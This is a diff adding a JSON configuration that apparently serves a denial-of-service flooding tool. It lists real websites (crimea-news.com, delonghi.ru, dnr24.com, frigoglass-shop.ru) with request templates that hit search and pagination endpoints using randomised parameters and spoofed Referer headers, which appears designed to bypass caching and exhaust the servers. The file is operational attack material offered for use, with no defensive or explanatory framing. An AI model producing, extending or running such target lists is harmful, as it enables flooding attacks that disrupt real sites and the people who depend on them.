@@ -1,0 +1,46 @@
+{
+  "targets": [
+    {
+      "target": "https://crimea-news.com",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://crimea-news.com/\", \"X-Requested-With\": \"XMLHttpRequest\"}",
+        "path_qs": "/index.php?do=getnews&page={{int(1,1000)}}&cat=0&count=10&sort=last&cityid=undefined&personid=undefined&theme_id=undefined"
+      }
+    },
+    {
+      "target": "https://delonghi.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://delonghi.ru/\"}",
+        "path_qs": "/search/{{int(1,8)}}?qs={{str(1)}}"
+      }
+    },
+    {
+      "target": "https://dnr24.com",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "do=search&subaction=search&search_start={{int(1,5)}}&full_search=0&result_from={{int(1,41)}}&story=%D0%B5%D1%82%D0%BE%D0%BC",
+        "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded\", \"Referer\": \"https://dnr24.com/\"}",
+        "path_qs": "/index.php?do=search",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://dnr24.com",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://dnr24.com/\"}",
+        "path_qs": "/dnr-news/page/{{int(1,366)}}/"
+      }
+    },
+    {
+      "target": "https://frigoglass-shop.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://frigoglass-shop.ru/\"}",
+        "path_qs": "/search?q={{str(1)}}"
+      }
+    }
+  ]
+}
